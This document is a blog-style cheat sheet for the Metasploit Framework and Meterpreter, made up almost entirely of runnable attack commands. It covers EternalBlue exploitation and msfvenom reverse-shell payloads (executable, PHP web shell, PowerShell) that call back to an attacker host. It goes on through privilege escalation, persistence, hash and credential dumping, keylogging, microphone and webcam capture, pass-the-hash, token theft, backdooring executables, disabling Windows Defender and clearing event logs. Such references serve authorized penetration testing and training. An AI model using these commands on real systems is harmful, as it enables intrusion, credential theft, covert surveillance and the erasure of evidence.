---
layout: post
title: Metasploit Framework and Meterpreter
date: 2025-04-10 17:38 +0300
categories: [Exploitation, Metasploit Framework]
---

## Metasploit Framework Basics

### Starting and Updating Metasploit

```bash
# Start Metasploit console
msfconsole

# Update Metasploit
apt update && apt upgrade metasploit-framework
# Or
msfupdate
```

### Core MSF Commands

```bash
# Search for modules
search type:exploit platform:windows ms17-010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show required options
show options

# Show available payloads
show payloads

# Set required options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444

# Execute the exploit
exploit
# Or
run
```

### Managing Sessions

```bash
# List active sessions
sessions -l

# Interact with a session
sessions -i 1

# Background current session
background
# Or Ctrl+Z

# Upgrade a shell to meterpreter
sessions -u 1

# Kill a session
sessions -k 1
```

### Generating Standalone Payloads

```bash
# Create an executable payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe

# Create a web payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php

# Create shellcode for scripting languages
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f ps1 -o payload.ps1
```

### Setting Up Handlers

```bash
# In msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
# Or for background execution
exploit -j
```

## Meterpreter Basics

### Basic Navigation and System Commands

```bash
# Get system information
sysinfo

# Show current user and privileges
getuid
getprivs

# Navigate the file system
pwd
cd c:\\Users\\Administrator
ls

# Process commands
ps
migrate 1234  # Migrate to process with PID 1234
```

### File Operations

```bash
# Download files
download C:\\Windows\\repair\\sam /home/kali/sam

# Upload files
upload /home/kali/nc.exe C:\\Windows\\Temp\\

# Search for files
search -f *.txt
search -f password.txt
```

### Access Elevation

```bash
# Attempt to get SYSTEM privileges
getsystem

# Check for UAC
run post/windows/gather/win_privs

# Bypass UAC
run post/windows/escalate/bypassuac
```

## Post-Exploitation with Meterpreter

### Privilege Escalation

```bash
# Run built-in privilege escalation checks
run post/multi/recon/local_exploit_suggester

# Check for common vulnerabilities
run post/windows/gather/enum_patches

# Escalate with a local exploit
run exploit/windows/local/cve_2019_1458
```

### Persistence Mechanisms

```bash
# Create persistence with startup folder
run persistence -A -L C:\\ -X -i 60 -p 4444 -r 192.168.1.5

# Create a service
run post/windows/manage/persistence_service

# Use registry autorun
run post/windows/manage/persistence
```

### Credential Harvesting

```bash
# Dump hashes from SAM
hashdump

# More comprehensive hash dumping
run post/windows/gather/smart_hashdump

# Use Mimikatz for in-memory credentials
load kiwi
creds_all

# Dump stored credentials
run post/windows/gather/credentials/credential_collector
```

### Keystroke Capture

```bash
# Start keylogger
keyscan_start

# Dump captured keystrokes
keyscan_dump

# Stop keylogger
keyscan_stop
```

### Network Enumeration and Pivoting

```bash
# Show network interfaces
ipconfig
route

# Port scanning
run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24

# Add route through compromised host
run post/multi/manage/autoroute SUBNET=10.10.10.0 NETMASK=255.255.255.0

# Set up a SOCKS proxy
run auxiliary/server/socks_proxy SRVPORT=9050 VERSION=4a
```

### Lateral Movement

```bash
# Pass the hash
run post/windows/gather/smart_hashdump
use exploit/windows/smb/psexec
set SMBPass aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f

# WMI execution
use exploit/windows/local/wmi
set SESSION 1
set RHOSTS 192.168.1.20
exploit
```

### Data Collection

```bash
# Screenshot
screenshot

# Record microphone
record_mic -d 30

# Webcam snapshot
webcam_snap

# Gather browser data
run post/windows/gather/enum_chrome
run post/multi/gather/firefox_creds
```

### System Reconnaissance

```bash
# Gather system information
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/enum_shares

# Check for AV and security products
run post/windows/gather/enum_av_excluded
run post/windows/gather/enum_av
```

### Clearing Tracks

```bash
# Clear event logs
clearev

# Delete specific files
rm C:\\Windows\\Temp\\payload.exe

# Disable Windows Defender (requires admin)
run post/windows/manage/disable_windows_defender
```

## Advanced Meterpreter Techniques

### Process Manipulation

```bash
# List running processes
ps

# Memory operations
pgrep explorer.exe
migrate 1234  # Process ID to migrate to

# Steal tokens
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

### Port Forwarding

```bash
# Forward remote port to local
portfwd add -l 3389 -p 3389 -r 192.168.1.10

# Reverse port forward (pivot)
portfwd add -R -l 8080 -p 80 -L 192.168.1.5
```

### Backdooring Files

```bash
# Backdoor executable
use post/windows/manage/backdoor_inject
set SESSION 1
set LHOST 192.168.1.5
set LPORT 5555
set EXE_PATH C:\\path\\to\\legit.exe
run
```

## Quick Reference: Common Commands

| Category | Command | Description |
|----------|---------|-------------|
| **Information Gathering** | `sysinfo` | System information |
|  | `getuid` | Current user |
|  | `ps` | Process list |
| **File Operations** | `download file` | Download from target |
|  | `upload file` | Upload to target |
|  | `search -f *.txt` | Find files |
| **Privilege Escalation** | `getsystem` | Attempt to get SYSTEM |
|  | `run post/multi/recon/local_exploit_suggester` | Find privilege escalation vectors |
| **Credential Access** | `hashdump` | Dump password hashes |
|  | `load kiwi` | Load Mimikatz extension |
|  | `creds_all` | Dump all credentials |
| **Lateral Movement** | `run autoroute` | Set up routing |
|  | `portfwd` | Port forwarding |
| **Persistence** | `run persistence` | Create persistence |
| **Collection** | `screenshot` | Capture screen |
|  | `keyscan_start` | Start keylogger |
| **Cleanup** | `clearev` | Clear event logs |


